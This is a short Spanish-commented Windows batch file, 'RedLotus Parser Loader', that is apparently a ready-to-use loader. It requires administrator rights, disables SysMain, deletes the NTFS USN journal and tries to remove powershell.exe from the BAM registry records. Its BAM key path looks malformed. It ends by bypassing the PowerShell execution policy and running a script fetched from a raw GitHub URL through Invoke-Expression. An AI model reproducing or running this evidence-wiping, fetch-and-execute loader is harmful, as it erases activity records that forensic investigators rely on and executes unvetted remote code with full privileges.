@echo off
:: Verificación de privilegios de Administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] ERROR: Se requieren privilegios de Administrador.
    pause
    exit /b
)

title RedLotus Parser Loader

:: 1. Detener SysMain (Superfetch)
echo [-] Gestionando SysMain...
sc stop SysMain >nul 2>&1
sc config SysMain start= disabled >nul 2>&1

:: 2. Borrar Journal de NTFS
echo [-] Limpiando USN Journal de C:...
fsutil usn deletejournal /d c: >nul 2>&1

:: 3. Mitigación de BAM (Background Activity Moderator)
:: Intentamos limpiar la entrada de powershell.exe en el registro de BAM antes de lanzar el comando
echo [-] Preparando entorno de ejecucion...
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\Bam\WannaPrivate\Parameters\UserSettings" /v "powershell.exe" /f >nul 2>&1

:: 4. Ejecución del Script Remoto (RedLotus-Parser)
echo [>] Ejecutando RedLotus-Parser desde GitHub...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/bna169/RedLotus-Parser/refs/heads/main/RedLotus-Parser.ps1')"

echo.
echo [+] Proceso finalizado.
pause